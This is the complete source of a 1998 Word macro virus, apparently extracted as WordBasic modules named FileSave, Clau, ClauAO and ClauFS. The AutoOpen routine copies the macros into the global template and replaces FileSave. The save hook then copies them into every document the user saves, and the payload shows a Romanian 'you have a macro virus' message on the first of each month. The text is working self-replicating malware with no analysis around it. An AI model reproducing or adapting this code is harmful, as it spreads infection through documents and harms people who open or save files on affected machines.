   Attribute VB_Name = "FileSave"

   Public Sub MAIN()
   Dim cMe$
   Dim c2Macro$
   'this becomes the FileSaveAs for the global template
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   On Error GoTo -1: On Error GoTo bail
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   If dlg.Format = 0 Then dlg.Format = 1
   cMe$ = WordBasic.[FileName$]()
   c2Macro$ = cMe$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:ClauAO", c2Macro$
   c2Macro$ = cMe$ + ":ClauAO"
   WordBasic.MacroCopy "Global:ClauAO", c2Macro$
   c2Macro$ = cMe$ + ":ClauFS"
   WordBasic.MacroCopy "Global:ClauFS", c2Macro$
   c2Macro$ = cMe$ + ":Clau"
   WordBasic.MacroCopy "Global:Clau", c2Macro$
   WordBasic.FileSaveAs dlg
   WordBasic.Call "Clau"
   GoTo done

   bail:
   If Err.Number <> 102 Then
       WordBasic.FileSaveAs dlg
   End If
   done:
   End Sub

   Attribute VB_Name = "Clau"

   Public Sub MAIN()
   Rem Este destul pentru a dovedi...
   If WordBasic.Day(WordBasic.Now()) = 1 Then WordBasic.MsgBox "Felicitari! Aveti un Macro Virus!!!", "ClauMacro-001 Virus from Romania 1998", 64
   End Sub

   Attribute VB_Name = "ClauAO"

   Public Sub MAIN()
   Dim cMe$
   Dim cMacro$
   On Error GoTo -1: On Error GoTo abort
   'add FileSave and copies of AutoOpen and FileSave.
   cMe$ = WordBasic.[FileName$]()
   cMacro$ = cMe$ + ":Clau"
   WordBasic.MacroCopy cMacro$, "Global:Clau"
   cMacro$ = cMe$ + ":ClauFS"
   WordBasic.MacroCopy cMacro$, "Global:FileSave"
   cMacro$ = cMe$ + ":ClauFS"
   WordBasic.MacroCopy cMacro$, "Global:ClauFS"
   cMacro$ = cMe$ + ":ClauAO"
   WordBasic.MacroCopy cMacro$, "Global:ClauAO"
   WordBasic.Call "Clau"
   abort:
   End Sub

   Attribute VB_Name = "ClauFS"

   Public Sub MAIN()
   Dim cMe$
   Dim c2Macro$
   'this becomes the FileSaveAs for the global template
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   On Error GoTo -1: On Error GoTo bail
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   If dlg.Format = 0 Then dlg.Format = 1
   cMe$ = WordBasic.[FileName$]()
   c2Macro$ = cMe$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:ClauAO", c2Macro$
   c2Macro$ = cMe$ + ":ClauAO"
   WordBasic.MacroCopy "Global:ClauAO", c2Macro$
   c2Macro$ = cMe$ + ":ClauFS"
   WordBasic.MacroCopy "Global:ClauFS", c2Macro$
   c2Macro$ = cMe$ + ":Clau"
   WordBasic.MacroCopy "Global:Clau", c2Macro$
   WordBasic.FileSaveAs dlg
   WordBasic.Call "Clau"
   GoTo done

   bail:
   If Err.Number <> 102 Then
       WordBasic.FileSaveAs dlg
   End If
   done:
   End Sub
